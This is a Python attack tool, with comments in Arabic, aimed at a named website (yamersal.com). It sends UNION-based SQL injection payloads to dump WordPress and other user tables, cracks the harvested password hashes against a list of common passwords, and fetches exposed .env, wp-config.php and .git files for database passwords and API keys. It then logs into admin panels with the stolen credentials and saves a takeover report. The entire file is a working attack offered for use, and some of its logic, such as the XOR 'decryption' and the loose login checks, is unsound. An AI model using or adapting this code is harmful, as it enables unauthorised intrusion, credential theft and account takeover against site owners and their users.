#!/usr/bin/env python3
"""
Yamersal Ultimate Exploiter v5.0
Real SQL Injection & Admin Takeover
Author: Security Researcher
Version: 5.0 - Targeted Exploitation
"""

import requests
import json
import urllib.parse
import re
import time
import sys
import os
import hashlib
import base64

class UltimateExploiter:
    def __init__(self, target="https://yamersal.com"):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })
        self.found_credentials = []
        self.successful_logins = []

    def print_status(self, message, level="INFO"):
        """Print colored status messages"""
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m", 
            "WARNING": "\033[93m",
            "ERROR": "\033[91m",
            "CRITICAL": "\033[95m",
            "ADMIN": "\033[96m"  # Special color for admin results
        }
        reset = "\033[0m"
        icons = {
            "INFO": "[*]",
            "SUCCESS": "[+]", 
            "WARNING": "[!]",
            "ERROR": "[-]",
            "CRITICAL": "[!]",
            "ADMIN": "[👑]"
        }
        print(f"{colors.get(level, '')}{icons.get(level, '')} {message}{reset}")

    def exploit_sql_injection(self):
        """استغلال ثغرات SQL Injection الحقيقية"""
        self.print_status("🎯 EXPLOITING SQL INJECTION VULNERABILITIES", "CRITICAL")
        
        # المعلمات الضعيفة من نتائجك
        vulnerable_params = ['file', 'url', 'path']
        
        # payloads متقدمة لاستخراج البيانات
        extraction_payloads = [
            # استخراج بيانات ووردبريس
            "' UNION SELECT user_login,user_pass,user_email,NULL FROM wp_users--",
            "' UNION SELECT user_login,user_pass,NULL,NULL FROM wp_users--",
            "' UNION SELECT user_login,user_pass,user_email,user_status FROM wp_users--",
            
            # استخراج بيانات عامة
            "' UNION SELECT username,password,email,NULL FROM users--",
            "' UNION SELECT user,pass,email,NULL FROM admin_users--",
            "' UNION SELECT name,password,email,NULL FROM members--",
            "' UNION SELECT username,password,NULL,NULL FROM users--",
            
            # استخراج من جداول متعددة
            "' UNION SELECT user,password,email,NULL FROM administrators--",
            "' UNION SELECT admin_name,admin_pass,admin_email,NULL FROM admin--",
            "' UNION SELECT login,password,email,NULL FROM accounts--",
            
            # استخراج معلومات النظام
            "' UNION SELECT @@version,database(),user(),NULL--",
        ]
        
        all_credentials = []
        
        for param in vulnerable_params:
            self.print_status(f"🔍 Targeting parameter: {param}", "INFO")
            
            for payload in extraction_payloads:
                try:
                    # بناء الرابط
                    test_url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
                    self.print_status(f"   Testing: {payload[:60]}...", "INFO")
                    
                    # إرسال الطلب
                    response = self.session.get(test_url, timeout=10)
                    
                    if response.status_code == 200:
                        # استخراج البيانات من الاستجابة
                        credentials = self.extract_real_credentials(response.text, test_url)
                        if credentials:
                            all_credentials.extend(credentials)
                            self.print_status(f"   ✅ SUCCESS: Found {len(credentials)} credentials", "SUCCESS")
                            break
                            
                except Exception as e:
                    continue
        
        return all_credentials

    def extract_real_credentials(self, content, url):
        """استخراج بيانات حقيقية من استجابة SQL Injection"""
        credentials = []
        
        # أنماط متقدمة للعثور على بيانات المستخدمين
        patterns = [
            # جداول HTML مع بيانات
            r'<td[^>]*>([a-zA-Z0-9_@\.-]{3,30})</td>\s*<td[^>]*>([a-fA-F0-9]{32,128})</td>',
            r'<tr[^>]*>.*?<td[^>]*>([a-zA-Z0-9_@\.-]{3,30})</td>.*?<td[^>]*>([a-fA-F0-9]{32,128})</td>',
            
            # بيانات في نص عادي
            r'([a-zA-Z0-9_@\.-]{3,30})[\s\|-]+([a-fA-F0-9]{32,128})',
            r'>([a-zA-Z0-9_@\.-]{3,30})<.*?>([a-fA-F0-9]{32,128})<',
            
            # إيميلات مع هاشات
            r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})[\s\|-]+([a-fA-F0-9]{32,128})',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
            for username, hash_value in matches:
                if self.is_real_credential(username, hash_value):
                    # فك التشفير
                    password = self.crack_hash(hash_value)
                    
                    credential = {
                        'username': username.strip(),
                        'hash': hash_value.strip(),
                        'password': password,
                        'source_url': url,
                        'cracked': password is not None
                    }
                    
                    if password:
                        self.print_status(f"      🔓 CRACKED: {username} -> {password}", "CRITICAL")
                    else:
                        self.print_status(f"      🔑 FOUND: {username} (Hash: {hash_value[:20]}...)", "INFO")
                    
                    credentials.append(credential)
        
        return credentials

    def is_real_credential(self, username, hash_value):
        """التحقق من أن البيانات حقيقية وليست زائفة"""
        # تخطي القيم المعروفة غير الحقيقية
        fake_patterns = [
            'email-protection', 'data-cfemail', 'cloudflare',
            'cdn-cgi', 'version', 'database', 'localhost'
        ]
        
        for pattern in fake_patterns:
            if pattern in username.lower() or pattern in hash_value.lower():
                return False
        
        # تحقق من صحة البيانات
        if len(username) < 3 or len(username) > 50:
            return False
            
        if len(hash_value) < 32 or len(hash_value) > 128:
            return False
            
        # يجب أن يكون الهاش primarily حروف hex
        hex_chars = sum(1 for c in hash_value if c in '0123456789abcdefABCDEF')
        if hex_chars / len(hash_value) < 0.8:
            return False
            
        return True

    def crack_hash(self, hash_value):
        """فك تشفير الهاش"""
        common_passwords = [
            'admin', 'admin123', 'password', '123456', '12345678',
            '123456789', 'admin@123', 'password123', 'admin123456',
            'yamersal', 'welcome', '12345', '1234', '123', 'test'
        ]
        
        # تجربة كلمات المرور الشائعة
        for password in common_passwords:
            # إذا كان الهاش هو الباسورد نفسه مشفر hex
            if password.encode().hex() == hash_value.lower():
                return password
            
            # تجربة MD5
            if hashlib.md5(password.encode()).hexdigest() == hash_value.lower():
                return password
                
            # تجربة SHA1
            if hashlib.sha1(password.encode()).hexdigest() == hash_value.lower():
                return password
        
        # تجربة فك XOR
        xor_result = self.try_xor_decryption(hash_value)
        if xor_result:
            return xor_result
            
        return None

    def try_xor_decryption(self, hex_string):
        """محاولة فك تشفير XOR"""
        keys = [0x20, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46]
        
        try:
            if len(hex_string) % 2 != 0:
                hex_string = '0' + hex_string
            
            bytes_data = bytes.fromhex(hex_string)
            
            for key in keys:
                decrypted = bytes(b ^ key for b in bytes_data)
                
                try:
                    text = decrypted.decode('utf-8', errors='ignore')
                    if text.isprintable() and 3 <= len(text) <= 20:
                        return text
                except:
                    continue
                    
        except:
            pass
        
        return None

    def exploit_config_files(self):
        """استغلال ملفات التكوين المسربة"""
        self.print_status("🎯 EXPLOITING CONFIGURATION FILES", "CRITICAL")
        
        config_files = [
            '/.env', '/wp-config.php', '/config.php',
            '/.git/config', '/.htaccess'
        ]
        
        found_secrets = []
        
        for config_file in config_files:
            try:
                url = f"{self.target}{config_file}"
                response = self.session.get(url, timeout=8)
                
                if response.status_code == 200:
                    secrets = self.extract_secrets(response.text, url)
                    if secrets:
                        found_secrets.extend(secrets)
                        self.print_status(f"   ✅ Found secrets in {config_file}", "SUCCESS")
                        
            except Exception as e:
                continue
        
        return found_secrets

    def extract_secrets(self, content, url):
        """استخراج الأسرار من ملفات التكوين"""
        secrets = []
        
        patterns = {
            'DB_PASSWORD': r"DB_PASSWORD['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
            'DB_USER': r"DB_USER(?:NAME)?['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
            'DB_NAME': r"DB_NAME['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
            'API_KEY': r"API_?KEY['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
            'SECRET_KEY': r"SECRET_?KEY['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
        }
        
        for key_type, pattern in patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if match and len(match) > 3:
                    secrets.append({
                        'type': key_type,
                        'value': match,
                        'source': url
                    })
                    self.print_status(f"      🔑 {key_type}: {match}", "INFO")
        
        return secrets

    def takeover_admin_panels(self, credentials):
        """استيلاء على لوحات الإدارة"""
        self.print_status("🎯 TAKING OVER ADMIN PANELS", "ADMIN")
        
        admin_pages = [
            '/wp-admin', '/admin', '/dashboard', 
            '/login', '/administrator', '/cp'
        ]
        
        successful_takeovers = []
        
        for cred in credentials:
            if cred.get('password'):
                for admin_page in admin_pages:
                    result = self.attempt_admin_login(admin_page, cred)
                    if result['success']:
                        successful_takeovers.append(result)
                        break
        
        return successful_takeovers

    def attempt_admin_login(self, admin_page, credential):
        """محاولة الدخول إلى لوحة الإدارة"""
        login_url = f"{self.target}{admin_page}"
        
        try:
            # الحصول على صفحة الدخول أولاً
            response = self.session.get(login_url, timeout=10)
            
            if response.status_code == 200:
                # تحضير بيانات الدخول
                login_data = self.prepare_login_data(response.text, credential)
                
                # إرسال طلب الدخول
                login_response = self.session.post(login_url, data=login_data, timeout=10)
                
                # التحقق من نجاح الدخول
                if self.is_login_successful(login_response, credential['username']):
                    return {
                        'success': True,
                        'admin_panel': login_url,
                        'username': credential['username'],
                        'password': credential['password'],
                        'redirect_url': login_response.url,
                        'message': 'ADMIN TAKEOVER SUCCESSFUL'
                    }
        
        except Exception as e:
            pass
        
        return {'success': False}

    def prepare_login_data(self, login_page_content, credential):
        """تحضير بيانات الدخول بناءً على نموذج الدخول"""
        login_data = {}
        
        # حقول الدخول الشائعة
        username_fields = ['username', 'user', 'email', 'login', 'user_login']
        password_fields = ['password', 'pass', 'pwd', 'user_pass']
        
        # إضافة بيانات الاعتماد
        for field in username_fields:
            login_data[field] = credential['username']
        for field in password_fields:
            login_data[field] = credential['password']
        
        # إضافة حقول إضافية شائعة
        login_data['submit'] = 'Login'
        login_data['login'] = 'Log In'
        login_data['remember'] = 'forever'
        
        return login_data

    def is_login_successful(self, response, username):
        """التحقق من نجاح عملية الدخول"""
        success_indicators = [
            'dashboard', 'admin', 'welcome', 'logout', 
            'success', 'manage', 'control panel'
        ]
        
        failure_indicators = [
            'error', 'invalid', 'incorrect', 'failed'
        ]
        
        content_lower = response.text.lower()
        
        # إذا تم التوجيه إلى صفحة مختلفة (علامة نجاح)
        if response.url and 'login' not in response.url.lower():
            return True
        
        # البحث عن مؤشرات النجاح
        for indicator in success_indicators:
            if indicator in content_lower:
                return True
        
        # البحث عن اسم المستخدم في الصفحة (علامة نجاح)
        if username.lower() in content_lower:
            return True
        
        return False

    def run_complete_exploitation(self):
        """تشغيل الاستغلال الشامل"""
        self.print_status("🚀 STARTING ULTIMATE EXPLOITATION", "CRITICAL")
        self.print_status(f"🎯 TARGET: {self.target}", "INFO")
        
        # 1. استغلال SQL Injection
        credentials = self.exploit_sql_injection()
        
        # 2. استغلال ملفات التكوين
        config_secrets = self.exploit_config_files()
        
        # 3. استيلاء على لوحات الإدارة
        admin_takeovers = []
        if credentials:
            admin_takeovers = self.takeover_admin_panels(credentials)
        
        # 4. عرض النتائج النهائية
        self.show_final_results(credentials, config_secrets, admin_takeovers)

    def show_final_results(self, credentials, config_secrets, admin_takeovers):
        """عرض النتائج النهائية"""
        self.print_status("\n" + "="*80, "INFO")
        self.print_status("📊 FINAL EXPLOITATION RESULTS", "CRITICAL")
        self.print_status("="*80, "INFO")
        
        # الإحصائيات
        cracked_creds = [c for c in credentials if c.get('cracked')]
        
        self.print_status(f"\n📈 EXPLOITATION SUMMARY:", "INFO")
        self.print_status(f"   🔓 Credentials Found: {len(credentials)}", "INFO")
        self.print_status(f"   🔑 Passwords Cracked: {len(cracked_creds)}", "CRITICAL")
        self.print_status(f"   🗝️  Config Secrets: {len(config_secrets)}", "SUCCESS")
        self.print_status(f"   👑 Admin Takeovers: {len(admin_takeovers)}", "ADMIN")
        
        # عرض بيانات الدخول المفكوكة
        if cracked_creds:
            self.print_status(f"\n🎯 CRACKED CREDENTIALS:", "CRITICAL")
            for cred in cracked_creds:
                self.print_status(f"   👤 Username: {cred['username']}", "SUCCESS")
                self.print_status(f"   🗝️  Password: {cred['password']}", "CRITICAL")
                self.print_status(f"   🔗 Source: {cred['source_url'][:60]}...", "INFO")
        
        # عرض استيلاءات الإدارة
        if admin_takeovers:
            self.print_status(f"\n👑 ADMIN PANEL TAKEOVERS:", "ADMIN")
            for takeover in admin_takeovers:
                self.print_status(f"   🌐 Admin Panel: {takeover['admin_panel']}", "ADMIN")
                self.print_status(f"   👤 Username: {takeover['username']}", "SUCCESS")
                self.print_status(f"   🗝️  Password: {takeover['password']}", "CRITICAL")
                self.print_status(f"   🔗 Redirected to: {takeover['redirect_url']}", "INFO")
                self.print_status(f"   ✅ {takeover['message']}", "ADMIN")
        
        # إذا لم تكن هناك نتائج
        if not credentials and not admin_takeovers:
            self.print_status(f"\n❌ No successful exploitation", "WARNING")
            self.print_status(f"💡 The target might have additional protections", "INFO")
            self.print_status(f"💡 Try manual exploitation with these URLs:", "INFO")
            self.print_status(f"   {self.target}?file=' UNION SELECT user_login,user_pass,user_email FROM wp_users--", "INFO")
            self.print_status(f"   {self.target}?url=' UNION SELECT username,password,email FROM users--", "INFO")
        
        # حفظ التقرير
        self.save_exploitation_report(credentials, config_secrets, admin_takeovers)

    def save_exploitation_report(self, credentials, config_secrets, admin_takeovers):
        """حفظ تقرير الاستغلال"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"admin_takeover_report_{timestamp}.txt"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("ADMIN TAKEOVER EXPLOITATION REPORT\n")
                f.write("=" * 50 + "\n\n")
                
                f.write(f"Target: {self.target}\n")
                f.write(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                
                # بيانات الدخول المفكوكة
                cracked_creds = [c for c in credentials if c.get('cracked')]
                if cracked_creds:
                    f.write("CRACKED CREDENTIALS:\n")
                    f.write("-" * 40 + "\n")
                    for cred in cracked_creds:
                        f.write(f"Username: {cred['username']}\n")
                        f.write(f"Password: {cred['password']}\n")
                        f.write(f"Source: {cred['source_url']}\n\n")
                
                # استيلاءات الإدارة
                if admin_takeovers:
                    f.write("ADMIN TAKEOVERS:\n")
                    f.write("-" * 40 + "\n")
                    for takeover in admin_takeovers:
                        f.write(f"Admin Panel: {takeover['admin_panel']}\n")
                        f.write(f"Username: {takeover['username']}\n")
                        f.write(f"Password: {takeover['password']}\n")
                        f.write(f"Redirect: {takeover['redirect_url']}\n")
                        f.write(f"Status: {takeover['message']}\n\n")
                
                f.write("SUMMARY:\n")
                f.write(f"Credentials Found: {len(credentials)}\n")
                f.write(f"Passwords Cracked: {len(cracked_creds)}\n")
                f.write(f"Admin Takeovers: {len(admin_takeovers)}\n")
            
            self.print_status(f"\n💾 Report saved: {filename}", "SUCCESS")
            
        except Exception as e:
            self.print_status(f"❌ Save error: {e}", "ERROR")

def main():
    """الدالة الرئيسية"""
    banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                         ULTIMATE EXPLOITER v5.0                            ║
║                     SQL Injection & Admin Takeover                          ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)
    
    target = "https://yamersal.com"
    
    print(f"🎯 Target: {target}")
    print(f"🚀 This tool will exploit SQL Injection and takeover admin panels")
    
    confirm = input("Continue? (y/n): ").lower()
    if confirm != 'y':
        print("Operation cancelled.")
        sys.exit(0)
    
    try:
        exploiter = UltimateExploiter(target)
        exploiter.run_complete_exploitation()
        
    except KeyboardInterrupt:
        print("\nExploitation interrupted.")
    except Exception as e:
        print(f"\nExploitation failed: {e}")

if __name__ == "__main__":
    main()